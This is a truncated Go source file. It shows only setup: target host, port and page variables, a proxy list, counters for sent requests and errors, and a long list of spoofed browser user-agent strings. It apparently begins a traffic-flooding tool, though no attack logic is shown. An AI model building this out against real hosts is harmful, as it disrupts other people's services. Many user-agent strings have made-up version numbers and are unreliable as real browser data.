package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
)

var (
	host      string
	port      string
	page      string
	mode      string
	key       string
	start     = make(chan bool)
	sentCount uint64
	errCount  uint64
	proxies   []string
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/118.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) Firefox/117.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)",
	"Mozilla/5.0 (Android 12; Mobile) Chrome/110.0.0.0 Mobile Safari/537.36",
     "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/86.0.4393.111 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; CPH2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5032.137 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; M2012K11C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5665.120 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/888.3.46 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/888.3.46",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_9) AppleWebKit/922.4.9 (KHTML, like Gecko) Version/16.0 Safari/922.4.9",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/601.5.40 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/601.5.40",
    "Mozilla/5.0 (X11; Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4094.100 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5445.131 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/108.0.5720.117 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/987.4.2 (KHTML, like Gecko) Version/14.0 Safari/987.4.2",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/711.1.42 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/711.1.42",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4604.126 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/109.0.5568.159 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/105.0.4510.155 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.4196.184 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; CPH2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.5947.132 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5751.193 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.4349.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4885.117 Safari/537.36",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0",
    "Mozilla/5.0 (Linux; Android 15; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5658.179 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/909.2.8 (KHTML, like Gecko) Version/13.0 Safari/909.2.8",
    "Mozilla/5.0 (Linux; Android 7; M2012K11C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4363.105 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/632.1.47 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/632.1.47",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Edg/101.0.1973.161 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edg/114.0.4650.183 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/829.4.5 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/829.4.5",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_9) AppleWebKit/616.1.8 (KHTML, like Gecko) Version/14.0 Safari/616.1.8",
    "Mozilla/5.0 (X11; Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.5854.195 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edg/119.0.2009.174 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/682.5.18 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/682.5.18",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/644.4.9 (KHTML, like Gecko) Version/16.0 Safari/644.4.9",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/995.1.11 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/995.1.11",
    "Mozilla/5.0 (Linux; Android 15; Vivo V21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.5268.198 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Vivo V21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.4872.136 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/82.0.5251.133 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/613.5.34 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/613.5.34",
    "Mozilla/5.0 (Linux; Android 11; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.4547.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; CPH2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.5296.117 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/89.0.4680.102 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_9) AppleWebKit/860.1.48 (KHTML, like Gecko) Version/17.0 Safari/860.1.48",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/99.0.5181.170 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5700.183 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/729.1.35 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/729.1.35",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/842.4.9 (KHTML, like Gecko) Version/15.0 Safari/842.4.9",
    "Mozilla/5.0 (X11; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.5379.109 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Realme 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5074.123 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 15; Vivo V21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4684.168 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; CPH2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4316.146 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/673.4.25 (KHTML, like Gecko) Version/13.0 Safari/673.4.25",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4036.139 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_9) AppleWebKit/722.4.24 (KHTML, like Gecko) Version/14.0 Safari/722.4.24",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/953.2.48 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/953.2.48",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0",
    "Mozilla/5.0 (Linux; Android 10; M2012K11C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.4521.140 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 15; Realme 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.5068.156 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.4574.187 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4099.150 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edg/113.0.2813.162 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.4695.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_9) AppleWebKit/676.5.45 (KHTML, like Gecko) Version/17.0 Safari/676.5.45",
    "Mozilla/5.0 (Linux; Android 11; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.5885.116 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_9) AppleWebKit/767.3.3 (KHTML, like Gecko) Version/14.0 Safari/767.3.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/602.5.15 (KHTML, like Gecko) Version/17.0 Safari/602.5.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5864.136 Safari/537.36",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.4041.169 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8; M2012K11C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4476.104 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/980.1.33 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/980.1.33",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/922.3.14 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/922.3.14",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Linux; Android 9; Realme 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4399.193 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
    "Mozilla/5.0 (Linux; Android 14; RMX3686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.5494.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edg/91.0.2868.188 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/935.2.36 (KHTML, like Gecko) Version/16.0 Safari/935.2.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/768.3.23 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/768.3.23",
    "Mozilla/5.0 (Linux; Android 14; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.4677.179 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edg/97.0.4798.106 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/757.1.25 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/757.1.25",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.5436.117 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5981.146 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; CPH2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.4505.119 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8; CPH2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.5917.198 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Vivo V21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.5855.173 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0",
    "Mozilla/5.0 (Linux; Android 10; Vivo V21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4067.130 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/92.0.4873.189 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.4166.157 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:113.0) Gecko/20100101 Firefox/113.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/965.1.29 (KHTML, like Gecko) Version/17.0 Safari/965.1.29",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/956.2.40 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/956.2.40",
    "Mozilla/5.0 (Linux; Android 15; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.5907.107 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/113.0.4594.198 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_9) AppleWebKit/924.4.43 (KHTML, like Gecko) Version/14.0 Safari/924.4.43",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/701.1.25 (KHTML, like Gecko) Version/16.0 Safari/701.1.25",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0",
    "Mozilla/5.0 (Linux; Android 10; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.5782.142 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_9) AppleWebKit/837.1.3 (KHTML, like Gecko) Version/17.0 Safari/837.1.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/940.3.30 (KHTML, like Gecko) Version/14.0 Safari/940.3.30",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_9) AppleWebKit/783.2.35 (KHTML, like Gecko) Version/13.0 Safari/783.2.35",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_9) AppleWebKit/878.2.21 (KHTML, like Gecko) Version/16.0 Safari/878.2.21",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/808.4.20 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/808.4.20",
    "Mozilla/5.0 (Linux; Android 14; M2012K11C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4551.183 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/877.3.31 (KHTML, like Gecko) Version/15.0 Safari/877.3.31",
    "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/116.0.4395.189 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8; CPH2231) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5709.183 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/95.0.5501.160 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/770.4.36 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/770.4.36",
    "Mozilla/5.0 (Linux; Android 15; Realme 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.4476.146 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/662.5.1 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/662.5.1",
    "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.5005.128 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/883.2.28 (KHTML, like Gecko) Version/17.0 Safari/883.2.28",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/873.5.8 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/873.5.8",
    "Mozilla/5.0 (Linux; Android 10; Realme 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4076.190 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.5839.169 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_9) AppleWebKit/928.1.36 (KHTML, like Gecko) Version/15.0 Safari/928.1.36",
    "Mozilla/5.0 (Linux; Android 11; Realme 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.4773.162 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/955.5.25 (KHTML, like Gecko) Version/15.0 Safari/955.5.25",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.4295.131 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Realme 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4619.121 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/883.4.32 (KHTML, like Gecko) Version/16.0 Safari/883.4.32",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/612.2.36 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/612.2.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5004.183 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/87.0.4346.139 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8; Realme 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.5000.180 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Realme 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.5897.150 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/736.4.38 (KHTML, like Gecko) Version/14.0 Safari/736.4.38",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Edg/115.0.2534.160 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/672.2.1 (KHTML, like Gecko) Version/16.0 Safari/672.2.1",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5073.104 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/679.5.17 (KHTML, like Gecko) Version/14.0 Safari/679.5.17",
    "Mozilla/5.0 (Linux; Android 14; M2012K11C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.4068.131 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/742.5.41 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/742.5.41",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/814.5.10 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/814.5.10",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/617.4.1 (KHTML, like Gecko) Version/15.0 Safari/617.4.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/717.5.44 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/717.5.44",
    "Mozilla/5.0 (X11; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/100.0.4924.198 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edg/106.0.1051.175 Safari/537.36",
    "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/102.0.4676.158 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/779.1.16 (KHTML, like Gecko) Version/15.0 Safari/779.1.16",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.4815.158 Safari/537.36",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4500.138 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/996.1.25 (KHTML, like Gecko) Version/13.0 Safari/996.1.25",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (Linux; Android 11; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.5525.142 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/926.1.49 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/926.1.49",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/993.2.7 (KHTML, like Gecko) Version/16.0 Safari/993.2.7",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/953.3.40 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/953.3.40",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Chrome/90.0.5178.126 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/731.1.47 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/731.1.47",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) Edg/103.0.3586.150 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Realme 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.5373.102 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/101.0.4669.175 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/113.0.4086.172 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/92.0.4180.196 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.4904.141 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/112.0.5237.189 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/830.1.24 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/830.1.24",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/634.3.11 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/634.3.11",
    "Mozilla/5.0 (Linux; Android 9; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4790.129 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/732.2.44 (KHTML, like Gecko) Version/13.0 Safari/732.2.44",
    "Mozilla/5.0 (X11; Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.4204.175 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/670.5.44 (KHTML, like Gecko) Version/15.0 Safari/670.5.44",
    "Mozilla/5.0 (Linux; Android 11; RMX3686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5243.149 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0",
    "Mozilla/5.0 (Linux; Android 7; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.5578.155 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/971.3.38 (KHTML, like Gecko) Version/17.0 Safari/971.3.38",
    "Mozilla/5.0 (Linux; Android 10; Vivo V21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.5520.199 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Realme 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.5765.158 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/973.4.48 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/973.4.48",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/635.2.44 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/635.2.44",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/111.0.5226.147 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Edg/110.0.2657.127 Safari/537.36",
